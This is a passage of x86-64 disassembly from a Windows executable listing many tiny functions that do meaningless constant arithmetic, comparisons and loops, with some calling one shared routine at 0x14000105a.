   140002758:	57                   	push   %rdi
   140002759:	41 54                	push   %r12
   14000275b:	41 55                	push   %r13
   14000275d:	48 83 ec 20          	sub    $0x20,%rsp
   140002761:	b8 dd 00 00 00       	mov    $0xdd,%eax
   140002766:	bb de 00 00 00       	mov    $0xde,%ebx
   14000276b:	21 d8                	and    %ebx,%eax
   14000276d:	09 c3                	or     %eax,%ebx
   14000276f:	f7 d0                	not    %eax
   140002771:	01 d8                	add    %ebx,%eax
   140002773:	48 83 c4 20          	add    $0x20,%rsp
   140002777:	41 5d                	pop    %r13
   140002779:	41 5c                	pop    %r12
   14000277b:	5f                   	pop    %rdi
   14000277c:	5e                   	pop    %rsi
   14000277d:	5b                   	pop    %rbx
   14000277e:	c3                   	ret
   14000277f:	53                   	push   %rbx
   140002780:	56                   	push   %rsi
   140002781:	57                   	push   %rdi
   140002782:	41 54                	push   %r12
   140002784:	41 55                	push   %r13
   140002786:	48 83 ec 20          	sub    $0x20,%rsp
   14000278a:	e8 cb e8 ff ff       	call   0x14000105a
   14000278f:	25 ff 00 00 00       	and    $0xff,%eax
   140002794:	b8 24 00 00 00       	mov    $0x24,%eax
   140002799:	bb 2c 00 00 00       	mov    $0x2c,%ebx
   14000279e:	83 f8 1e             	cmp    $0x1e,%eax
   1400027a1:	7c 09                	jl     0x1400027ac
   1400027a3:	83 fb 46             	cmp    $0x46,%ebx
   1400027a6:	7f 09                	jg     0x1400027b1
   1400027a8:	01 d8                	add    %ebx,%eax
   1400027aa:	eb 08                	jmp    0x1400027b4
   1400027ac:	83 e8 05             	sub    $0x5,%eax
   1400027af:	eb 03                	jmp    0x1400027b4
   1400027b1:	83 c3 0a             	add    $0xa,%ebx
   1400027b4:	48 83 c4 20          	add    $0x20,%rsp
   1400027b8:	41 5d                	pop    %r13
   1400027ba:	41 5c                	pop    %r12
   1400027bc:	5f                   	pop    %rdi
   1400027bd:	5e                   	pop    %rsi
   1400027be:	5b                   	pop    %rbx
   1400027bf:	c3                   	ret
   1400027c0:	53                   	push   %rbx
   1400027c1:	56                   	push   %rsi
   1400027c2:	57                   	push   %rdi
   1400027c3:	41 54                	push   %r12
   1400027c5:	41 55                	push   %r13
   1400027c7:	48 83 ec 20          	sub    $0x20,%rsp
   1400027cb:	b8 01 00 00 00       	mov    $0x1,%eax
   1400027d0:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400027d5:	0f af c1             	imul   %ecx,%eax
   1400027d8:	ff c9                	dec    %ecx
   1400027da:	75 f9                	jne    0x1400027d5
   1400027dc:	48 83 c4 20          	add    $0x20,%rsp
   1400027e0:	41 5d                	pop    %r13
   1400027e2:	41 5c                	pop    %r12
   1400027e4:	5f                   	pop    %rdi
   1400027e5:	5e                   	pop    %rsi
   1400027e6:	5b                   	pop    %rbx
   1400027e7:	c3                   	ret
   1400027e8:	53                   	push   %rbx
   1400027e9:	56                   	push   %rsi
   1400027ea:	57                   	push   %rdi
   1400027eb:	41 54                	push   %r12
   1400027ed:	41 55                	push   %r13
   1400027ef:	48 83 ec 20          	sub    $0x20,%rsp
   1400027f3:	b8 41 00 00 00       	mov    $0x41,%eax
   1400027f8:	83 f8 1e             	cmp    $0x1e,%eax
   1400027fb:	7e 0a                	jle    0x140002807
   1400027fd:	83 f8 46             	cmp    $0x46,%eax
   140002800:	7d 0a                	jge    0x14000280c
   140002802:	6b c0 02             	imul   $0x2,%eax,%eax
   140002805:	eb 08                	jmp    0x14000280f
   140002807:	83 c0 0f             	add    $0xf,%eax
   14000280a:	eb 03                	jmp    0x14000280f
   14000280c:	83 e8 0a             	sub    $0xa,%eax
   14000280f:	48 83 c4 20          	add    $0x20,%rsp
   140002813:	41 5d                	pop    %r13
   140002815:	41 5c                	pop    %r12
   140002817:	5f                   	pop    %rdi
   140002818:	5e                   	pop    %rsi
   140002819:	5b                   	pop    %rbx
   14000281a:	c3                   	ret
   14000281b:	53                   	push   %rbx
   14000281c:	56                   	push   %rsi
   14000281d:	57                   	push   %rdi
   14000281e:	41 54                	push   %r12
   140002820:	41 55                	push   %r13
   140002822:	48 83 ec 20          	sub    $0x20,%rsp
   140002826:	e8 2f e8 ff ff       	call   0x14000105a
   14000282b:	25 ff 00 00 00       	and    $0xff,%eax
   140002830:	31 c0                	xor    %eax,%eax
   140002832:	bb 02 00 00 00       	mov    $0x2,%ebx
   140002837:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000283c:	83 c0 01             	add    $0x1,%eax
   14000283f:	ff c9                	dec    %ecx
   140002841:	75 f9                	jne    0x14000283c
   140002843:	ff cb                	dec    %ebx
   140002845:	75 f0                	jne    0x140002837
   140002847:	48 83 c4 20          	add    $0x20,%rsp
   14000284b:	41 5d                	pop    %r13
   14000284d:	41 5c                	pop    %r12
   14000284f:	5f                   	pop    %rdi
   140002850:	5e                   	pop    %rsi
   140002851:	5b                   	pop    %rbx
   140002852:	c3                   	ret
   140002853:	53                   	push   %rbx
   140002854:	56                   	push   %rsi
   140002855:	57                   	push   %rdi
   140002856:	41 54                	push   %r12
   140002858:	41 55                	push   %r13
   14000285a:	48 83 ec 20          	sub    $0x20,%rsp
   14000285e:	b8 27 00 00 00       	mov    $0x27,%eax
   140002863:	d1 e0                	shl    $1,%eax
   140002865:	72 02                	jb     0x140002869
   140002867:	d1 e8                	shr    $1,%eax
   140002869:	48 83 c4 20          	add    $0x20,%rsp
   14000286d:	41 5d                	pop    %r13
   14000286f:	41 5c                	pop    %r12
   140002871:	5f                   	pop    %rdi
   140002872:	5e                   	pop    %rsi
   140002873:	5b                   	pop    %rbx
   140002874:	c3                   	ret
   140002875:	53                   	push   %rbx
   140002876:	56                   	push   %rsi
   140002877:	57                   	push   %rdi
   140002878:	41 54                	push   %r12
   14000287a:	41 55                	push   %r13
   14000287c:	48 83 ec 20          	sub    $0x20,%rsp
   140002880:	e8 d5 e7 ff ff       	call   0x14000105a
   140002885:	25 ff 00 00 00       	and    $0xff,%eax
   14000288a:	b8 01 00 00 00       	mov    $0x1,%eax
   14000288f:	b9 03 00 00 00       	mov    $0x3,%ecx
   140002894:	d1 e0                	shl    $1,%eax
   140002896:	ff c9                	dec    %ecx
   140002898:	75 fa                	jne    0x140002894
   14000289a:	48 83 c4 20          	add    $0x20,%rsp
   14000289e:	41 5d                	pop    %r13
   1400028a0:	41 5c                	pop    %r12
   1400028a2:	5f                   	pop    %rdi
   1400028a3:	5e                   	pop    %rsi
   1400028a4:	5b                   	pop    %rbx
   1400028a5:	c3                   	ret
   1400028a6:	53                   	push   %rbx
   1400028a7:	56                   	push   %rsi
   1400028a8:	57                   	push   %rdi
   1400028a9:	41 54                	push   %r12
   1400028ab:	41 55                	push   %r13
   1400028ad:	48 83 ec 20          	sub    $0x20,%rsp
   1400028b1:	31 c0                	xor    %eax,%eax
   1400028b3:	b9 03 00 00 00       	mov    $0x3,%ecx
   1400028b8:	83 c0 04             	add    $0x4,%eax
   1400028bb:	83 f8 0a             	cmp    $0xa,%eax
   1400028be:	7f 04                	jg     0x1400028c4
   1400028c0:	ff c9                	dec    %ecx
   1400028c2:	75 f4                	jne    0x1400028b8
   1400028c4:	48 83 c4 20          	add    $0x20,%rsp
   1400028c8:	41 5d                	pop    %r13
   1400028ca:	41 5c                	pop    %r12
   1400028cc:	5f                   	pop    %rdi
   1400028cd:	5e                   	pop    %rsi
   1400028ce:	5b                   	pop    %rbx
   1400028cf:	c3                   	ret
   1400028d0:	53                   	push   %rbx
   1400028d1:	56                   	push   %rsi
   1400028d2:	57                   	push   %rdi
   1400028d3:	41 54                	push   %r12
   1400028d5:	41 55                	push   %r13
   1400028d7:	48 83 ec 20          	sub    $0x20,%rsp
   1400028db:	e8 7a e7 ff ff       	call   0x14000105a
   1400028e0:	25 ff 00 00 00       	and    $0xff,%eax
   1400028e5:	b8 04 00 00 00       	mov    $0x4,%eax
   1400028ea:	b9 03 00 00 00       	mov    $0x3,%ecx
   1400028ef:	83 c0 02             	add    $0x2,%eax
   1400028f2:	ff c9                	dec    %ecx
   1400028f4:	75 f9                	jne    0x1400028ef
   1400028f6:	48 83 c4 20          	add    $0x20,%rsp
   1400028fa:	41 5d                	pop    %r13
   1400028fc:	41 5c                	pop    %r12
   1400028fe:	5f                   	pop    %rdi
   1400028ff:	5e                   	pop    %rsi
   140002900:	5b                   	pop    %rbx
   140002901:	c3                   	ret
   140002902:	53                   	push   %rbx
   140002903:	56                   	push   %rsi
   140002904:	57                   	push   %rdi
   140002905:	41 54                	push   %r12
   140002907:	41 55                	push   %r13
   140002909:	48 83 ec 20          	sub    $0x20,%rsp
   14000290d:	b8 59 00 00 00       	mov    $0x59,%eax
   140002912:	83 e0 0f             	and    $0xf,%eax
   140002915:	83 f8 27             	cmp    $0x27,%eax
   140002918:	7c 0a                	jl     0x140002924
   14000291a:	83 f8 3f             	cmp    $0x3f,%eax
   14000291d:	7f 0a                	jg     0x140002929
   14000291f:	83 c0 0a             	add    $0xa,%eax
   140002922:	eb 08                	jmp    0x14000292c
   140002924:	83 c0 05             	add    $0x5,%eax
   140002927:	eb 03                	jmp    0x14000292c
   140002929:	83 e8 05             	sub    $0x5,%eax
   14000292c:	48 83 c4 20          	add    $0x20,%rsp
   140002930:	41 5d                	pop    %r13
   140002932:	41 5c                	pop    %r12
   140002934:	5f                   	pop    %rdi
   140002935:	5e                   	pop    %rsi
   140002936:	5b                   	pop    %rbx
   140002937:	c3                   	ret
   140002938:	53                   	push   %rbx
   140002939:	56                   	push   %rsi
   14000293a:	57                   	push   %rdi
   14000293b:	41 54                	push   %r12
   14000293d:	41 55                	push   %r13
   14000293f:	48 83 ec 20          	sub    $0x20,%rsp
   140002943:	b8 05 00 00 00       	mov    $0x5,%eax
   140002948:	83 c0 29             	add    $0x29,%eax
   14000294b:	71 07                	jno    0x140002954
   14000294d:	b8 00 00 00 00       	mov    $0x0,%eax
   140002952:	eb 03                	jmp    0x140002957
   140002954:	83 e8 02             	sub    $0x2,%eax
   140002957:	48 83 c4 20          	add    $0x20,%rsp
   14000295b:	41 5d                	pop    %r13
   14000295d:	41 5c                	pop    %r12
   14000295f:	5f                   	pop    %rdi
   140002960:	5e                   	pop    %rsi
   140002961:	5b                   	pop    %rbx
   140002962:	c3                   	ret
   140002963:	53                   	push   %rbx
   140002964:	56                   	push   %rsi
   140002965:	57                   	push   %rdi
   140002966:	41 54                	push   %r12
   140002968:	41 55                	push   %r13
   14000296a:	48 83 ec 20          	sub    $0x20,%rsp
   14000296e:	b8 b8 00 00 00       	mov    $0xb8,%eax
   140002973:	d1 e8                	shr    $1,%eax
   140002975:	72 05                	jb     0x14000297c
   140002977:	c1 e0 02             	shl    $0x2,%eax
   14000297a:	eb 02                	jmp    0x14000297e
   14000297c:	d1 e0                	shl    $1,%eax
   14000297e:	48 83 c4 20          	add    $0x20,%rsp
   140002982:	41 5d                	pop    %r13
   140002984:	41 5c                	pop    %r12
   140002986:	5f                   	pop    %rdi
   140002987:	5e                   	pop    %rsi
   140002988:	5b                   	pop    %rbx
   140002989:	c3                   	ret
   14000298a:	53                   	push   %rbx
   14000298b:	56                   	push   %rsi
   14000298c:	57                   	push   %rdi
   14000298d:	41 54                	push   %r12
   14000298f:	41 55                	push   %r13
   140002991:	48 83 ec 20          	sub    $0x20,%rsp
   140002995:	b8 53 00 00 00       	mov    $0x53,%eax
   14000299a:	bb 21 00 00 00       	mov    $0x21,%ebx
   14000299f:	01 d8                	add    %ebx,%eax
   1400029a1:	d1 e0                	shl    $1,%eax
   1400029a3:	48 83 c4 20          	add    $0x20,%rsp
   1400029a7:	41 5d                	pop    %r13
   1400029a9:	41 5c                	pop    %r12
   1400029ab:	5f                   	pop    %rdi
   1400029ac:	5e                   	pop    %rsi
   1400029ad:	5b                   	pop    %rbx
   1400029ae:	c3                   	ret
   1400029af:	53                   	push   %rbx
   1400029b0:	56                   	push   %rsi
   1400029b1:	57                   	push   %rdi
   1400029b2:	41 54                	push   %r12
   1400029b4:	41 55                	push   %r13
   1400029b6:	48 83 ec 20          	sub    $0x20,%rsp
   1400029ba:	e8 9b e6 ff ff       	call   0x14000105a
   1400029bf:	25 ff 00 00 00       	and    $0xff,%eax
   1400029c4:	b8 12 00 00 00       	mov    $0x12,%eax
   1400029c9:	83 c0 19             	add    $0x19,%eax
   1400029cc:	72 05                	jb     0x1400029d3
   1400029ce:	83 c0 05             	add    $0x5,%eax
   1400029d1:	eb 03                	jmp    0x1400029d6
   1400029d3:	83 c0 0a             	add    $0xa,%eax
   1400029d6:	48 83 c4 20          	add    $0x20,%rsp
   1400029da:	41 5d                	pop    %r13
   1400029dc:	41 5c                	pop    %r12
   1400029de:	5f                   	pop    %rdi
   1400029df:	5e                   	pop    %rsi
   1400029e0:	5b                   	pop    %rbx
   1400029e1:	c3                   	ret
   1400029e2:	53                   	push   %rbx
   1400029e3:	56                   	push   %rsi
   1400029e4:	57                   	push   %rdi
   1400029e5:	41 54                	push   %r12
   1400029e7:	41 55                	push   %r13
   1400029e9:	48 83 ec 20          	sub    $0x20,%rsp
   1400029ed:	e8 68 e6 ff ff       	call   0x14000105a
   1400029f2:	25 ff 00 00 00       	and    $0xff,%eax
   1400029f7:	6a 1e                	push   $0x1e
   1400029f9:	6a 07                	push   $0x7
   1400029fb:	58                   	pop    %rax
   1400029fc:	5b                   	pop    %rbx
   1400029fd:	48 0f af c3          	imul   %rbx,%rax
   140002a01:	48 83 c4 20          	add    $0x20,%rsp
   140002a05:	41 5d                	pop    %r13
   140002a07:	41 5c                	pop    %r12
   140002a09:	5f                   	pop    %rdi
   140002a0a:	5e                   	pop    %rsi
   140002a0b:	5b                   	pop    %rbx
   140002a0c:	c3                   	ret
   140002a0d:	53                   	push   %rbx
   140002a0e:	56                   	push   %rsi
   140002a0f:	57                   	push   %rdi
   140002a10:	41 54                	push   %r12
   140002a12:	41 55                	push   %r13
   140002a14:	48 83 ec 20          	sub    $0x20,%rsp
   140002a18:	b8 23 00 00 00       	mov    $0x23,%eax
   140002a1d:	bb 17 00 00 00       	mov    $0x17,%ebx
   140002a22:	83 f8 1e             	cmp    $0x1e,%eax
   140002a25:	7c 09                	jl     0x140002a30
   140002a27:	83 fb 46             	cmp    $0x46,%ebx
   140002a2a:	7f 09                	jg     0x140002a35
   140002a2c:	01 d8                	add    %ebx,%eax
   140002a2e:	eb 08                	jmp    0x140002a38
   140002a30:	83 e8 05             	sub    $0x5,%eax
   140002a33:	eb 03                	jmp    0x140002a38
   140002a35:	83 c3 0a             	add    $0xa,%ebx
   140002a38:	48 83 c4 20          	add    $0x20,%rsp
   140002a3c:	41 5d                	pop    %r13
   140002a3e:	41 5c                	pop    %r12
   140002a40:	5f                   	pop    %rdi
   140002a41:	5e                   	pop    %rsi
   140002a42:	5b                   	pop    %rbx
   140002a43:	c3                   	ret
   140002a44:	53                   	push   %rbx
   140002a45:	56                   	push   %rsi
   140002a46:	57                   	push   %rdi
   140002a47:	41 54                	push   %r12
   140002a49:	41 55                	push   %r13
   140002a4b:	48 83 ec 20          	sub    $0x20,%rsp
   140002a4f:	6a 60                	push   $0x60
   140002a51:	6a 1a                	push   $0x1a
   140002a53:	58                   	pop    %rax
   140002a54:	5b                   	pop    %rbx
   140002a55:	48 83 c4 20          	add    $0x20,%rsp
   140002a59:	41 5d                	pop    %r13
   140002a5b:	41 5c                	pop    %r12
   140002a5d:	5f                   	pop    %rdi
   140002a5e:	5e                   	pop    %rsi
   140002a5f:	5b                   	pop    %rbx
   140002a60:	c3                   	ret
   140002a61:	53                   	push   %rbx
   140002a62:	56                   	push   %rsi
   140002a63:	57                   	push   %rdi
   140002a64:	41 54                	push   %r12
   140002a66:	41 55                	push   %r13
   140002a68:	48 83 ec 20          	sub    $0x20,%rsp
   140002a6c:	e8 e9 e5 ff ff       	call   0x14000105a
   140002a71:	25 ff 00 00 00       	and    $0xff,%eax
   140002a76:	31 c0                	xor    %eax,%eax
   140002a78:	b9 02 00 00 00       	mov    $0x2,%ecx
   140002a7d:	83 c0 03             	add    $0x3,%eax
   140002a80:	83 f8 0a             	cmp    $0xa,%eax
   140002a83:	7f 04                	jg     0x140002a89
   140002a85:	ff c9                	dec    %ecx
   140002a87:	75 f4                	jne    0x140002a7d
   140002a89:	48 83 c4 20          	add    $0x20,%rsp
   140002a8d:	41 5d                	pop    %r13
   140002a8f:	41 5c                	pop    %r12
   140002a91:	5f                   	pop    %rdi
   140002a92:	5e                   	pop    %rsi
   140002a93:	5b                   	pop    %rbx
   140002a94:	c3                   	ret
   140002a95:	53                   	push   %rbx
   140002a96:	56                   	push   %rsi
   140002a97:	57                   	push   %rdi
   140002a98:	41 54                	push   %r12
   140002a9a:	41 55                	push   %r13
   140002a9c:	48 83 ec 20          	sub    $0x20,%rsp
   140002aa0:	e8 b5 e5 ff ff       	call   0x14000105a
   140002aa5:	25 ff 00 00 00       	and    $0xff,%eax
   140002aaa:	b8 cd 00 00 00       	mov    $0xcd,%eax
   140002aaf:	d1 e0                	shl    $1,%eax
   140002ab1:	72 02                	jb     0x140002ab5
   140002ab3:	d1 e8                	shr    $1,%eax
   140002ab5:	48 83 c4 20          	add    $0x20,%rsp
   140002ab9:	41 5d                	pop    %r13
   140002abb:	41 5c                	pop    %r12
   140002abd:	5f                   	pop    %rdi
   140002abe:	5e                   	pop    %rsi
   140002abf:	5b                   	pop    %rbx
   140002ac0:	c3                   	ret
   140002ac1:	53                   	push   %rbx
   140002ac2:	56                   	push   %rsi
   140002ac3:	57                   	push   %rdi
   140002ac4:	41 54                	push   %r12
   140002ac6:	41 55                	push   %r13
   140002ac8:	48 83 ec 20          	sub    $0x20,%rsp
   140002acc:	b8 02 00 00 00       	mov    $0x2,%eax
   140002ad1:	83 c0 02             	add    $0x2,%eax
   140002ad4:	d1 e0                	shl    $1,%eax
   140002ad6:	83 f8 0a             	cmp    $0xa,%eax
   140002ad9:	7c 03                	jl     0x140002ade
   140002adb:	83 e8 05             	sub    $0x5,%eax
   140002ade:	48 83 c4 20          	add    $0x20,%rsp
   140002ae2:	41 5d                	pop    %r13
   140002ae4:	41 5c                	pop    %r12
   140002ae6:	5f                   	pop    %rdi
   140002ae7:	5e                   	pop    %rsi
   140002ae8:	5b                   	pop    %rbx
   140002ae9:	c3                   	ret
   140002aea:	53                   	push   %rbx
   140002aeb:	56                   	push   %rsi
   140002aec:	57                   	push   %rdi
   140002aed:	41 54                	push   %r12
   140002aef:	41 55                	push   %r13
   140002af1:	48 83 ec 20          	sub    $0x20,%rsp
   140002af5:	b8 30 00 00 00       	mov    $0x30,%eax
   140002afa:	bb 2f 00 00 00       	mov    $0x2f,%ebx
   140002aff:	39 d8                	cmp    %ebx,%eax
   140002b01:	7f 04                	jg     0x140002b07
   140002b03:	01 d8                	add    %ebx,%eax
   140002b05:	eb 02                	jmp    0x140002b09
   140002b07:	29 d8                	sub    %ebx,%eax
   140002b09:	48 83 c4 20          	add    $0x20,%rsp
   140002b0d:	41 5d                	pop    %r13
   140002b0f:	41 5c                	pop    %r12
   140002b11:	5f                   	pop    %rdi
   140002b12:	5e                   	pop    %rsi
   140002b13:	5b                   	pop    %rbx
   140002b14:	c3                   	ret
   140002b15:	53                   	push   %rbx
   140002b16:	56                   	push   %rsi
   140002b17:	57                   	push   %rdi
   140002b18:	41 54                	push   %r12
   140002b1a:	41 55                	push   %r13
   140002b1c:	48 83 ec 20          	sub    $0x20,%rsp
   140002b20:	b8 12 00 00 00       	mov    $0x12,%eax
   140002b25:	bb 1e 00 00 00       	mov    $0x1e,%ebx
   140002b2a:	01 d8                	add    %ebx,%eax
   140002b2c:	89 c1                	mov    %eax,%ecx
   140002b2e:	01 cb                	add    %ecx,%ebx
   140002b30:	48 83 c4 20          	add    $0x20,%rsp
   140002b34:	41 5d                	pop    %r13
   140002b36:	41 5c                	pop    %r12
   140002b38:	5f                   	pop    %rdi
   140002b39:	5e                   	pop    %rsi
   140002b3a:	5b                   	pop    %rbx
   140002b3b:	c3                   	ret
   140002b3c:	53                   	push   %rbx
   140002b3d:	56                   	push   %rsi
   140002b3e:	57                   	push   %rdi
   140002b3f:	41 54                	push   %r12
   140002b41:	41 55                	push   %r13
   140002b43:	48 83 ec 20          	sub    $0x20,%rsp
   140002b47:	b8 37 00 00 00       	mov    $0x37,%eax
   140002b4c:	83 c0 0b             	add    $0xb,%eax
   140002b4f:	72 05                	jb     0x140002b56
   140002b51:	83 c0 05             	add    $0x5,%eax
   140002b54:	eb 03                	jmp    0x140002b59
   140002b56:	83 c0 0a             	add    $0xa,%eax
   140002b59:	48 83 c4 20          	add    $0x20,%rsp
   140002b5d:	41 5d                	pop    %r13
   140002b5f:	41 5c                	pop    %r12
   140002b61:	5f                   	pop    %rdi
   140002b62:	5e                   	pop    %rsi
   140002b63:	5b                   	pop    %rbx
   140002b64:	c3                   	ret
   140002b65:	53                   	push   %rbx
   140002b66:	56                   	push   %rsi
   140002b67:	57                   	push   %rdi
   140002b68:	41 54                	push   %r12
   140002b6a:	41 55                	push   %r13
   140002b6c:	48 83 ec 20          	sub    $0x20,%rsp
   140002b70:	e8 e5 e4 ff ff       	call   0x14000105a
   140002b75:	25 ff 00 00 00       	and    $0xff,%eax
   140002b7a:	b8 04 00 00 00       	mov    $0x4,%eax
   140002b7f:	b9 03 00 00 00       	mov    $0x3,%ecx
   140002b84:	83 c0 02             	add    $0x2,%eax
   140002b87:	ff c9                	dec    %ecx
   140002b89:	75 f9                	jne    0x140002b84
   140002b8b:	48 83 c4 20          	add    $0x20,%rsp
   140002b8f:	41 5d                	pop    %r13
   140002b91:	41 5c                	pop    %r12
   140002b93:	5f                   	pop    %rdi
   140002b94:	5e                   	pop    %rsi
   140002b95:	5b                   	pop    %rbx
   140002b96:	c3                   	ret
   140002b97:	53                   	push   %rbx
   140002b98:	56                   	push   %rsi
   140002b99:	57                   	push   %rdi
   140002b9a:	41 54                	push   %r12
   140002b9c:	41 55                	push   %r13
   140002b9e:	48 83 ec 20          	sub    $0x20,%rsp
   140002ba2:	b8 d0 00 00 00       	mov    $0xd0,%eax
   140002ba7:	bb 0e 00 00 00       	mov    $0xe,%ebx
   140002bac:	01 d8                	add    %ebx,%eax
   140002bae:	d1 e0                	shl    $1,%eax
   140002bb0:	48 83 c4 20          	add    $0x20,%rsp
   140002bb4:	41 5d                	pop    %r13
   140002bb6:	41 5c                	pop    %r12
   140002bb8:	5f                   	pop    %rdi
   140002bb9:	5e                   	pop    %rsi
   140002bba:	5b                   	pop    %rbx
   140002bbb:	c3                   	ret
   140002bbc:	53                   	push   %rbx
   140002bbd:	56                   	push   %rsi
   140002bbe:	57                   	push   %rdi
   140002bbf:	41 54                	push   %r12
   140002bc1:	41 55                	push   %r13
   140002bc3:	48 83 ec 20          	sub    $0x20,%rsp
   140002bc7:	b8 51 00 00 00       	mov    $0x51,%eax
   140002bcc:	83 e0 0f             	and    $0xf,%eax
   140002bcf:	83 f8 18             	cmp    $0x18,%eax
   140002bd2:	7c 0a                	jl     0x140002bde
   140002bd4:	83 f8 40             	cmp    $0x40,%eax
   140002bd7:	7f 0a                	jg     0x140002be3
   140002bd9:	83 c0 0a             	add    $0xa,%eax
   140002bdc:	eb 08                	jmp    0x140002be6
   140002bde:	83 c0 05             	add    $0x5,%eax
   140002be1:	eb 03                	jmp    0x140002be6
   140002be3:	83 e8 05             	sub    $0x5,%eax
   140002be6:	48 83 c4 20          	add    $0x20,%rsp
   140002bea:	41 5d                	pop    %r13
   140002bec:	41 5c                	pop    %r12
   140002bee:	5f                   	pop    %rdi
   140002bef:	5e                   	pop    %rsi
   140002bf0:	5b                   	pop    %rbx
   140002bf1:	c3                   	ret
   140002bf2:	53                   	push   %rbx
   140002bf3:	56                   	push   %rsi
   140002bf4:	57                   	push   %rdi
   140002bf5:	41 54                	push   %r12
   140002bf7:	41 55                	push   %r13
   140002bf9:	48 83 ec 20          	sub    $0x20,%rsp
   140002bfd:	48 c7 c0 01 00 00 00 	mov    $0x1,%rax
   140002c04:	48 8d 58 01          	lea    0x1(%rax),%rbx
   140002c08:	48 01 d8             	add    %rbx,%rax
   140002c0b:	48 83 c4 20          	add    $0x20,%rsp
   140002c0f:	41 5d                	pop    %r13
   140002c11:	41 5c                	pop    %r12
   140002c13:	5f                   	pop    %rdi
   140002c14:	5e                   	pop    %rsi
   140002c15:	5b                   	pop    %rbx
   140002c16:	c3                   	ret
   140002c17:	53                   	push   %rbx
   140002c18:	56                   	push   %rsi
   140002c19:	57                   	push   %rdi
   140002c1a:	41 54                	push   %r12
   140002c1c:	41 55                	push   %r13
   140002c1e:	48 83 ec 20          	sub    $0x20,%rsp
   140002c22:	b8 37 00 00 00       	mov    $0x37,%eax
   140002c27:	83 f8 32             	cmp    $0x32,%eax
   140002c2a:	7f 05                	jg     0x140002c31
   140002c2c:	6b c0 02             	imul   $0x2,%eax,%eax
   140002c2f:	eb 03                	jmp    0x140002c34
   140002c31:	6b c0 03             	imul   $0x3,%eax,%eax
   140002c34:	48 83 c4 20          	add    $0x20,%rsp
   140002c38:	41 5d                	pop    %r13
   140002c3a:	41 5c                	pop    %r12
   140002c3c:	5f                   	pop    %rdi
   140002c3d:	5e                   	pop    %rsi
   140002c3e:	5b                   	pop    %rbx
   140002c3f:	c3                   	ret
   140002c40:	53                   	push   %rbx
   140002c41:	56                   	push   %rsi
   140002c42:	57                   	push   %rdi
   140002c43:	41 54                	push   %r12
   140002c45:	41 55                	push   %r13
   140002c47:	48 83 ec 20          	sub    $0x20,%rsp
   140002c4b:	6a 2d                	push   $0x2d
   140002c4d:	6a 0b                	push   $0xb
   140002c4f:	58                   	pop    %rax
   140002c50:	5b                   	pop    %rbx
   140002c51:	48 0f af c3          	imul   %rbx,%rax
   140002c55:	48 83 c4 20          	add    $0x20,%rsp
   140002c59:	41 5d                	pop    %r13
   140002c5b:	41 5c                	pop    %r12
   140002c5d:	5f                   	pop    %rdi
   140002c5e:	5e                   	pop    %rsi
   140002c5f:	5b                   	pop    %rbx
   140002c60:	c3                   	ret
   140002c61:	53                   	push   %rbx
   140002c62:	56                   	push   %rsi
   140002c63:	57                   	push   %rdi
   140002c64:	41 54                	push   %r12
   140002c66:	41 55                	push   %r13
   140002c68:	48 83 ec 20          	sub    $0x20,%rsp
   140002c6c:	b8 cb 00 00 00       	mov    $0xcb,%eax
   140002c71:	bb 0e 00 00 00       	mov    $0xe,%ebx
   140002c76:	01 d8                	add    %ebx,%eax
   140002c78:	d1 e0                	shl    $1,%eax
   140002c7a:	48 83 c4 20          	add    $0x20,%rsp
   140002c7e:	41 5d                	pop    %r13
   140002c80:	41 5c                	pop    %r12
   140002c82:	5f                   	pop    %rdi
   140002c83:	5e                   	pop    %rsi
   140002c84:	5b                   	pop    %rbx
   140002c85:	c3                   	ret
   140002c86:	53                   	push   %rbx
   140002c87:	56                   	push   %rsi
   140002c88:	57                   	push   %rdi
   140002c89:	41 54                	push   %r12
   140002c8b:	41 55                	push   %r13
   140002c8d:	48 83 ec 20          	sub    $0x20,%rsp
   140002c91:	b8 39 00 00 00       	mov    $0x39,%eax
   140002c96:	83 c0 11             	add    $0x11,%eax
   140002c99:	83 c0 14             	add    $0x14,%eax
   140002c9c:	83 c0 05             	add    $0x5,%eax
   140002c9f:	48 83 c4 20          	add    $0x20,%rsp
   140002ca3:	41 5d                	pop    %r13
   140002ca5:	41 5c                	pop    %r12
   140002ca7:	5f                   	pop    %rdi
   140002ca8:	5e                   	pop    %rsi
   140002ca9:	5b                   	pop    %rbx
   140002caa:	c3                   	ret
   140002cab:	53                   	push   %rbx
   140002cac:	56                   	push   %rsi
   140002cad:	57                   	push   %rdi
   140002cae:	41 54                	push   %r12
   140002cb0:	41 55                	push   %r13
   140002cb2:	48 83 ec 20          	sub    $0x20,%rsp
   140002cb6:	b8 45 00 00 00       	mov    $0x45,%eax
   140002cbb:	bb 13 00 00 00       	mov    $0x13,%ebx
   140002cc0:	01 d8                	add    %ebx,%eax
   140002cc2:	d1 e0                	shl    $1,%eax
   140002cc4:	48 83 c4 20          	add    $0x20,%rsp
   140002cc8:	41 5d                	pop    %r13
   140002cca:	41 5c                	pop    %r12
   140002ccc:	5f                   	pop    %rdi
   140002ccd:	5e                   	pop    %rsi
   140002cce:	5b                   	pop    %rbx
   140002ccf:	c3                   	ret
   140002cd0:	53                   	push   %rbx
   140002cd1:	56                   	push   %rsi
   140002cd2:	57                   	push   %rdi
   140002cd3:	41 54                	push   %r12
   140002cd5:	41 55                	push   %r13
   140002cd7:	48 83 ec 20          	sub    $0x20,%rsp
   140002cdb:	6a 13                	push   $0x13
   140002cdd:	6a 52                	push   $0x52
   140002cdf:	58                   	pop    %rax
   140002ce0:	5b                   	pop    %rbx
   140002ce1:	48 01 d8             	add    %rbx,%rax
   140002ce4:	48 83 c4 20          	add    $0x20,%rsp
   140002ce8:	41 5d                	pop    %r13
   140002cea:	41 5c                	pop    %r12
   140002cec:	5f                   	pop    %rdi
   140002ced:	5e                   	pop    %rsi
   140002cee:	5b                   	pop    %rbx
   140002cef:	c3                   	ret
   140002cf0:	53                   	push   %rbx
   140002cf1:	56                   	push   %rsi
   140002cf2:	57                   	push   %rdi
   140002cf3:	41 54                	push   %r12
   140002cf5:	41 55                	push   %r13
   140002cf7:	48 83 ec 20          	sub    $0x20,%rsp
   140002cfb:	b8 0b 00 00 00       	mov    $0xb,%eax
   140002d00:	83 e0 0f             	and    $0xf,%eax
   140002d03:	83 f8 21             	cmp    $0x21,%eax
   140002d06:	7c 0a                	jl     0x140002d12
   140002d08:	83 f8 4e             	cmp    $0x4e,%eax
   140002d0b:	7f 0a                	jg     0x140002d17
   140002d0d:	83 c0 0a             	add    $0xa,%eax
   140002d10:	eb 08                	jmp    0x140002d1a
